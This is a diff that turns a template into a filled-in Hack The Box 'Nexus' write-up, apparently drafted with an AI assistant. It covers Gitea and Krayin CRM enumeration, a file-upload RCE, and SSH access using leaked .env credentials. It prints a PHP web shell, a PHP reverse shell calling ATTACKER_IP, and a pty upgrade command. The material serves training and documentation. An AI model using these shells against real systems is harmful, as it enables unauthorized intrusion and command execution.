@@ -1,142 +1,138 @@
-# Nexus — Hack The Box Write-up
+HTB Nexus – Penetration Testing Report
+1. Enumeration
+1.1 Gitea – Source Code Management
+During enumeration, we discovered a Gitea instance running:
+- Service: Gitea
+- Version: 1.26.0
+We also identified a Git repository containing application-related files. Further inspection of the repository revealed an .env file containing credentials that would later be useful for SSH access.
+1.2 Billing Application – Krayin CRM
+We discovered the virtual host:
 
-**Platform:** Hack The Box  
-**Machine:** Nexus  
-**Operating System:** Linux
-**Difficulty:** meidl 
-**Status:** In Progress  
-**Current Progress:** User access obtained — Root flag remaining
+billing.nexus.htb
 
----
+Accessing this hostname redirected us to:
 
-## 1. Overview
+http://billing.nexus.htb/admin/login
 
-This write-up documents my hands-on experience solving the Nexus machine on Hack The Box.
+The login page revealed that the application was running Krayin CRM.
 
-The objective is to analyze the target, enumerate exposed services, identify vulnerabilities, obtain initial access, and investigate privilege escalation opportunities.
+We used credentials discovered earlier during the assessment:
+Parameter	Value
+Username	j.matthew@nexus.htb
+Password	Previously discovered password
+Application	Krayin CRM
 
-The machine is currently in progress. Initial access has been achieved, while root-level access remains to be completed.
+Authentication was successful.
+1.3 Version Identification
+After logging in, we identified the installed Krayin CRM version:
 
-## 2. Reconnaissance
+2.2.0
 
-### Target Information
+A search for publicly disclosed vulnerabilities affecting this version led us to:
 
-- Target IP: `REDACTED`
-- Platform: Hack The Box
-- Operating System: To be documented
+CVE-2026-38526
 
-### Initial Network Scan
+Reference: CVE-2026-38526 – Proof of Concept
+2. Vulnerability Analysis
+2.1 CVE-2026-38526 – Unauthenticated/Authenticated File Upload to Remote Code Execution
+Critical – CVSS 9.9 (reported)
+Attribute	Details
+Vulnerability	Arbitrary file upload leading to RCE
+Application	Krayin CRM
+Version	2.2.0
+CVE	CVE-2026-38526
+Potential impact	Remote Code Execution
 
-**Tool:** Nmap
+The vulnerability disclosure described an attack involving malicious PHP file uploads, potentially allowing an attacker to execute commands on the server.
+3. Exploitation – Initial Access
+3.1 PHP Web Shell Creation
+We prepared a PHP web shell:
+<?php echo shell_exec($_GET["c"]); ?>
 
-```bash
-#nmap -sC -sV -Pn TARGET-IP
-```
 
-### Findings
+The script uses shell_exec() to execute commands supplied through the c URL parameter.
 
-| Port | Service |
-|---|---|---|---|
-| 80/tcp | http |
-| 22/tcp | ssh |
-## 3. Enumeration
+For example, the following request structure allows command execution:
+http://TARGET/shell.php?c=id
 
-Document the discovered services and potential attack surface.
 
-### Service Enumeration
+3.2 Reverse Shell
+After uploading the PHP file through the vulnerable functionality, we prepared a reverse shell connection.
 
-- Open ports:80,22
-- Running services:http,ssh 
-- Service versions:-<img width="1536" height="912" alt="image" src="https://github.com/user-attachments/assets/01e0205a-4e95-4c33-a830-d3e9135330f7" />
+PHP reverse shell command:
+php -r '$sock=fsockopen("ATTACKER_IP",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
-- Interesting findings:-
 
-### Additional Enumeration
+The payload was URL-encoded before being sent through the web application.
 
-Document relevant commands, outputs, and observations.
+Replace ATTACKER_IP with your actual listener IP in your private notes. Avoid publishing sensitive infrastructure details unnecessarily.
+3.3 Obtaining an Interactive Shell
+After establishing the reverse shell, we upgraded it to an interactive Bash shell using:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 
-## 4. Initial Access
 
-**Status:** Completed
+This provided a more usable terminal environment.
+4. Credential Discovery and SSH Access
+4.1 Git Repository Inspection
+During further investigation of the Git repository, we discovered an .env file.
 
-Document the actual steps that led to initial access.
+The file contained credentials that could be reused for SSH authentication.
+4.2 SSH Authentication
+Using the discovered credentials, we connected to the machine as the user jones.
+ssh jones@TARGET_IP
 
-### Methodology
 
-- Identified entry point:
-- Vulnerability or weakness:
-- Exploitation steps:
-- Access obtained:
+The password is intentionally omitted from the public report.
 
-### Evidence
+SSH authentication was successful.
+5. User Flag
+After obtaining SSH access, we navigated to the user's home directory and retrieved the user flag:
+cat user.txt
 
-Add relevant terminal output and screenshots, with sensitive information redacted.
 
-## 5. User-Level Access
+User access obtained
 
-**Status:** Completed
+6. Current Attack Path
+This diagram summarizes your progress so far.
+Gitea – Port / Web Enumeration
 
-Document how user-level access was obtained.
+Version 1.26.0 · Repository discovery
 
-- User account:
-- Access method:
-- User flag: Obtained
 
-## 6. Privilege Escalation
+Billing – Krayin CRM
 
-**Status:** In Progress
+Version 2.2.0 · Credentials discovered earlier
 
-The objective of this stage is to investigate possible privilege escalation paths and obtain root-level access.
 
-### Enumeration
+CVE-2026-38526
 
-Document:
+PHP upload · Remote code execution
 
-- User permissions
-- Sudo privileges
-- Running processes
-- Scheduled tasks
-- SUID binaries
-- Interesting files and configurations
 
-### Investigation Notes
+Reverse Shell
 
-```bash
-# Add commands and actual findings here
-```
+Interactive Bash session
 
-### Root Access
 
-**Status:** Not yet obtained.
+Git Repository – .env
 
-The privilege escalation process is still ongoing.
+SSH credentials discovered
 
-## 7. Flags & Results
 
-| Objective | Status |
-|---|---|
-| Initial Access | Completed |
-| User Flag | Obtained |
-| Root Flag | Pending |
-| Machine Completion | In Progress |
+SSH – jones
+User flag obtained
 
-## 8. Tools Used
 
-Add only tools actually used during the investigation.
+Privilege Escalation
 
-- Nmap
-- To be documented
+Pending – Root access
 
-## 9. Key Learnings
 
-To be completed after finishing the machine.
-
-## 10. Conclusion
-
-The Nexus machine provided practical experience in reconnaissance, enumeration, initial access, and privilege escalation investigation.
-
-The machine remains in progress until root-level access is obtained.
-
----
-
-**Disclaimer:** This write-up documents work performed in an authorized Hack The Box environment.
+7. Important corrections before publishing
+A few things to verify:
+1. Confirm that CVE-2026-38526 actually applies to the installed Krayin version and document the conditions required for exploitation.
+2. Include evidence of successful PHP command execution.
+3. Include a screenshot of SSH access as jones.
+4. Never publish actual passwords, .env secrets, reverse-shell IPs, or flags.
+5. Keep the distinction between the initial web-shell access and subsequent SSH access clear.
+Next: Send me what you did after logging in as jones — especially your privilege-escalation enumeration commands and outputs. We'll document the root compromise in the same format.
